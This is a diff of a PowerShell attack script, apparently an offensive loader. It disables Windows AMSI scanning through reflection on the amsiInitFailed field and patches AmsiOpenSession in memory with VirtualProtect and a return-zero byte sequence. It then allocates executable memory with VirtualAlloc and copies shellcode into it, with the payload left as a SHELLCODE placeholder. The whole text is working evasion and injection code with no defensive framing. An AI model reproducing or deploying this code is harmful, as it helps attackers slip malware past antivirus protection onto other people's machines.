@@ -1,16 +1,16 @@
-0
 function UnhookAMSI {
-         $a="iUtils"
-         $m="System.Management.Automation.Ams"
-         [Ref].Assembly.GetType("$m$a").GetField('amsiInitFai'+'led','NonPublic,Static').SetValue($null,$true)
+
+ $m="System.Management.Automation.Ams";[Ref].Assembly.GetType("$m"+"iUtils").GetField('amsiInitFai'+'led','NonPublic,Static').SetValue($null,$true)
 
 }
 
 function LookupFunc {
-        Param ($moduleName, $functionName)
-        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 
-        return $assem.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)))), $functionName))
+	Param ($moduleName, $functionName)
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$tmp=@()
+	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
 }
 
 function getDelegateType {
@@ -25,13 +25,24 @@ function getDelegateType {
 	return $type.CreateType()
 }
 
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+# XOR RAX,RAX 
+#$buf = [Byte[]] (0x48,0x31,0xC0)  
+$buf = [byte[]] (0x31, 0xC0, 0xC3)
 UnhookAMSI
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, $buf.length)
 
+#Restore the memory protections
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
 start-sleep(5)
 
 $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc),(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
 
 [Byte[]] $buf = (SHELLCODE)
+
 
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
 
